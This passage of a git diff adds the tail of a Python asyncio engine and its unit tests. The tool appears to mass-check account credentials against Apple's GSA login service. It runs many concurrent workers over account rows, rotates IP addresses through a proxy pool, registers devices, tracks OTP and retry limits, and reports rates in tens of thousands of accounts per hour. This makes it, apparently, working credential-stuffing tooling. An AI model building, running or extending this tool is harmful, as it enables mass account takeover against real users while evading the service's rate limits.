++                    'detail': str(result.get('apple_message') or result.get('detail') or '')[:160],
++                    'http': result.get('http'), 'ms': round(elapsed, 1),
++                    'thread_cpu_ms': 0.0, 'attempts': attempts,
++                    'retry_reason': retry_reason, 'budget_hit': budget_hit,
++                }
++                record(row)
++                queue.task_done()
++                served += 1
++        except BaseException as exc:  # noqa: BLE001
++            state['worker_errors'].append(f'{type(exc).__name__}: {exc}')
++        finally:
++            state['device_in_use'].discard(slot)
++            state['device_registering'].discard(slot)
++            if transport is not None:
++                await transport.close()
++            if ip_pool and route:
++                ip_pool.release(tid, route, expires, healthy=True)
++
++    async def make_payload(final=False):
++        elapsed = max(0.001, time.perf_counter() - started)
++        cpu = time.process_time() - proc_cpu0
++        samples = state['samples']
++        values = sorted(row['ms'] for row in samples)
++        p50 = round(statistics.median(values)) if values else None
++        p90 = values[int(len(values) * .9)] if values else None
++        registered = (0 if mock else await loop.run_in_executor(
++            io_pool, count_registered_devices, args.device_root,
++            'https://new.ani.sidestore.io'))
++        done = state['done']
++        payload = {
++            'started': time.strftime('%H:%M:%S', time.localtime(wall_started)),
++            'elapsed': round(elapsed, 1), 'total': len(rows), 'done': done,
++            'rate': round(done / elapsed, 2), 'per_hour': round(done / elapsed * 3600),
++            'eta': round((len(rows) - done) / (done / elapsed), 0) if done else None,
++            'threads': concurrency, 'processes': 1, 'engine': 'asyncio',
++            'backend': SRP_MATH_BACKEND, 'accounts': args.accounts,
++            'cpu_seconds': round(cpu, 2), 'cpu_cores': round(cpu / elapsed, 3),
++            'cpu_per_account': round(cpu / done * 1000, 1) if done else 0,
++            'proc_cpu_seconds': round(cpu, 2), 'proc_cpu_cores': round(cpu / elapsed, 3),
++            'ip_fail': state['ip_fail'],
++            'ip_pool': ip_pool.snapshot() if ip_pool else {},
++            'retried': state['retried'], 'by_retry': dict(state['by_retry']),
++            'budget_hit': state['budget_hit'], 'otp_hit': state['otp_hit'],
++            'otp_fetch': state['otp_fetch'], 'by_status': dict(state['by_status']),
++            'p50': p50, 'p90': p90, 'recent': list(state['recent']),
++            'device_ready': registered, 'device_registered': registered,
++            'device_in_use': len(state['device_in_use']),
++            'device_registering': len(state['device_registering']),
++            'register_errors': state['register_errors'],
++            'register_error_types': dict(state['register_error_types']),
++            'worker_errors': list(state['worker_errors'][-8:]),
++            'runtime_threads': threading.active_count(),
++            'finished': bool(final and done == len(rows)),
++            'status': 'complete' if final and done == len(rows) else 'running',
++            'incomplete': max(0, len(rows) - done) if final else 0,
++        }
++        return payload
++
++    async def live_writer():
++        while not stop.is_set():
++            payload = await make_payload(False)
++            tmp = args.live + '.tmp'
++            with open(tmp, 'w', encoding='utf-8') as handle:
++                json.dump(payload, handle, ensure_ascii=False)
++            os.replace(tmp, args.live)
++            await asyncio.sleep(1)
++
++    print(f'账号 {len(rows)} 条 | asyncio 协程 {concurrency} | '
++          f'CPU executor {cpu_workers} | SRP {SRP_MATH_BACKEND}')
++    writer_task = asyncio.create_task(live_writer(), name='live-writer')
++    workers = [asyncio.create_task(worker(tid), name=f'worker-{tid}')
++               for tid in range(concurrency)]
++    await asyncio.gather(*workers)
++    stop.set()
++    writer_task.cancel()
++    await asyncio.gather(writer_task, return_exceptions=True)
++    if write_buffer:
++        sink.write('\n'.join(write_buffer) + '\n')
++    sink.close()
++    payload = await make_payload(True)
++    tmp = args.live + '.tmp'
++    with open(tmp, 'w', encoding='utf-8') as handle:
++        json.dump(payload, handle, ensure_ascii=False)
++    os.replace(tmp, args.live)
++    if ip_pool:
++        await loop.run_in_executor(io_pool, ip_pool.stop)
++    io_pool.shutdown(wait=True, cancel_futures=True)
++    cpu_pool.shutdown(wait=True, cancel_futures=True)
++    print(f"完成 {payload['done']}/{payload['total']} | {payload['rate']} 条/秒 | "
++          f"{payload['per_hour']/10000:.1f} 万/小时 | CPU {payload['cpu_cores']} 核")
++    if payload['worker_errors']:
++        print('worker errors:', payload['worker_errors'])
++    return 0 if payload['finished'] else 2
++
++
++def main() -> int:
++    return asyncio.run(run(parser().parse_args()))
++
++
++if __name__ == '__main__':
++    raise SystemExit(main())
+diff --git a/tests/test_async_engine.py b/tests/test_async_engine.py
+new file mode 100644
+index 0000000..d60817a
+--- /dev/null
++++ b/tests/test_async_engine.py
+@@ -0,0 +1,72 @@
++import asyncio
++import os
++import plistlib
++import tempfile
++import time
++import unittest
++
++from fastcheck.protocols import gsa_async
++from gsafast.ippool import IpPool
++
++
++class AsyncEngineTests(unittest.IsolatedAsyncioTestCase):
++    async def test_async_transport_reuses_event_loop_socket(self):
++        async def handler(reader, writer):
++            headers = await reader.readuntil(b'\r\n\r\n')
++            length = 0
++            for line in headers.split(b'\r\n'):
++                if line.lower().startswith(b'content-length:'):
++                    length = int(line.split(b':', 1)[1])
++            if length:
++                await reader.readexactly(length)
++            body = plistlib.dumps({'Response': {'Status': {'ec': 0}}})
++            writer.write(b'HTTP/1.1 200 OK\r\nContent-Type: text/x-xml-plist\r\n'
++                         + f'Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n'.encode()
++                         + body)
++            await writer.drain()
++            writer.close()
++
++        server = await asyncio.start_server(handler, '127.0.0.1', 0)
++        old = gsa_async.GSA_URL
++        gsa_async.GSA_URL = f'http://127.0.0.1:{server.sockets[0].getsockname()[1]}/gsa'
++        try:
++            async with gsa_async.AsyncGsaSession(None) as session:
++                outcome = await session.post(b'x', {}, 2, client_info='test')
++        finally:
++            gsa_async.GSA_URL = old
++            server.close()
++            await server.wait_closed()
++        self.assertEqual(200, outcome.http_status)
++        self.assertEqual(0, outcome.payload['Response']['Status']['ec'])
++
++    async def test_mock_check_yields_without_network(self):
++        old = os.environ.get('FASTCHECK_MOCK')
++        os.environ['FASTCHECK_MOCK'] = '1'
++        try:
++            before = time.perf_counter()
++            results = await asyncio.gather(*(
++                gsa_async.check(f'user{i}@example.com', 'x', None, identity={})
++                for i in range(100)
++            ))
++        finally:
++            if old is None:
++                os.environ.pop('FASTCHECK_MOCK', None)
++            else:
++                os.environ['FASTCHECK_MOCK'] = old
++        self.assertEqual(100, len(results))
++        self.assertLess(time.perf_counter() - before, 0.5)
++        self.assertTrue(all('status' in row for row in results))
++
++    def test_ip_pool_nowait_does_not_count_starvation(self):
++        pool = IpPool('http://invalid/{num}', threads=1)
++        before = pool.stats['blocked']
++        self.assertEqual((None, 0.0), pool.acquire_nowait(0))
++        self.assertEqual(before, pool.stats['blocked'])
++
++    def test_multi_process_uses_async_worker(self):
++        import run_mp
++        self.assertTrue(run_mp.WORKER.endswith('simple_async.py'))
++
++
++if __name__ == '__main__':
++    unittest.main()
